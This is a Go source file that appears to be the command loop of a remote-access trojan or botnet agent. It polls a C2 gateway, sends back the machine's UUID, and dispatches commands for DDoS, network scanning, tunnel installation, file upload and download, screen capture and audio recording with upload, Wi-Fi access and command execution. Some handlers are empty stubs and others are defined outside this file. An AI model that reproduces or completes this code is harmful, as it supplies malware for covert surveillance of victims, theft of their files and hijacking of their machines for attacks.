package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

var ErrInvalidPacket = errors.New("The packet received is incorect")
var ErrRuntime = errors.New("An error occur when the command start")

type CommandBase struct {
	Name string `json:"name"`
	Args interface{}
}
type RunCommandParams struct {
	Command string `json:"command"`
}

func getCommandName(body []byte) (string, []byte) {
	fmt.Printf("[COMMAND] - Received command : %s\n", string(body[:]))
	data := CommandBase{}
	err := json.Unmarshal(body, &data)
	if err != nil {
		log.Fatal(err)
	}

	return data.Name, body
}

func runCommand(params RunCommandParams) {

}

func SetInvalidPayload() {}

func ReplyToC2(result string) {

	fmt.Println("[REPLY] - Sending response to C2...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}

	var jsonData = []byte(`{
		"name": "COMMAND_RESULT",
		"id": "` + uuid + `",
		"result" : ` + result + `
	}`)

	request, error := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	response, error := client.Do(request)
	if error != nil {
		panic(error)
	}
	defer response.Body.Close()

}

func ReplyErrToC2(err error) {}

func getCommand() {

	fmt.Println("[COMMAND] - Fetching command to execute...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}
	data := map[string]interface{}{
		"name": "GET_COMMANDS",
		"id":   uuid,
	}

	b, err := json.Marshal(data)

	if err != nil {
		fmt.Println("Error during json")
	}

	request, err := http.NewRequest("POST", url, bytes.NewBuffer(b))
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error during the get command req")
	}
	defer response.Body.Close()

	receivedData, err := io.ReadAll(response.Body)

	if err != nil {
	}

	name, byteBody := getCommandName(receivedData)

	switch name {

	case "Announce":
		_ = announce()
		break

	case "SetRelay":
		data := SetRelayParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setRelay(data)
		ReplyToC2(`{ "success" : true, "message" : "Relay has been edited successfully !" }`)
		// TODO need to restart agent -> best solution is reboot
		break

	case "SetPullingRate":
		data := SetPullingRateParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setPullingRate(data)
		ReplyToC2(`{ "success" : true, "message" : "PullingRate has been edited successfully !" }`)
		break

	case "OpenTunnel":
		data := OpenTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		url, err := openTunnel(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "OpenTunnel on '%s' " }`, url))
		break

	case "InstallTunnel":
		data := InstallTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		_, err := installTunnel(data)
		if err != nil {
			ReplyToC2(`{ "success" : false, "message" : "Can't install the tunnel'" }`)
		}

	case "InstallIpScanner":
		data := InstallIpScannerParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		_, err := installIpScanner(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(`{ "success" : true, "message" : "IpScanner has been installed successfully" }`)

	case "GetSysInfo":
		data := GetSysInfoParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		scanResult, err := getSysInfo(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, scanResult))

	case "Ping":
		data := PingParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		result, err := ping(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		fmt.Println(result)
		ReplyToC2(`{ "success" : true, "message" : "ping success" }`)

	case "Wifi":
		data := WifiParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		wifi(data)

	case "Ddos":
		data := DdosParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		ddos(data)

	case "DownloadFile":
		data := DownloadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		downloadFile(data)

	case "NetworkScan":
		data := NetworkScanParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		networkScan(data)

	case "UploadFile":
		data := UploadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		err := uploadFile(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, "File has been uploaded successfully"))
		break

	case "GetPublicIp":
		data := GetPublicIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		ip, err := getPublicIp(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, ip))
		break

	case "GetPrivateIp":
		data := GetPrivateIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		response := map[string]interface{}{
			"success": true,
			"message": getPrivateIp(data),
		}

		res, err := json.Marshal(response)
		fmt.Println(string(res))
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(string(res))
		break

	//case "CreateRegValue":
	//	data := CreateRegValueParams{}
	//	err = json.Unmarshal(byteBody, &data)
	//	if err != nil {
	//		ReplyErrToC2(ErrInvalidPacket)
	//	}
	//
	//	CreateRegValue(data)
	//case "EditRegValue":
	//	data := EditRegValueParams{}
	//	err = json.Unmarshal(byteBody, &data)
	//	if err != nil {
	//		ReplyErrToC2(ErrInvalidPacket)
	//	}
	//
	//	EditRegValue(data)
	//
	//case "DeleteRegValue":
	//	data := DeleteRegValueParams{}
	//	err = json.Unmarshal(byteBody, &data)
	//	if err != nil {
	//		ReplyErrToC2(ErrInvalidPacket)
	//	}
	//
	//	DeleteRegValue(data)

	case "RunCommand":
		data := RunCommandParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		runCommand(data)

	case "Screenshot":
		data := ScreenshotParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		rawBytes, err := CaptureScreen(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		// save bytes to file
		f, err := os.CreateTemp("", "screenshots-*.png")

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		defer os.Remove(f.Name())

		_, err = f.Write(rawBytes)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(`{ "success" : true, "message" : "Screenshot has been taken successfully" }`)

		UploadScreenshot(f.Name())
		break

	case "AudioCapture":
		data := AudioCaptureParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		fmt.Printf("AudioCapture : listening during %d file will be saved at %s\n", data.Length, data.Path)
		_ = RecordAudio(data)
		// wait for the file to be created
		time.Sleep(1 * time.Second)
		ReplyToC2(`{ "success" : true, "message" : "Audio has been recorded successfully" }`)
		UploadAudio(data.Path)
		break

	case "Idle":
		// TODO
		break

	default:
		fmt.Println("Not handled command")
		fmt.Println(name)
		break
	}

}
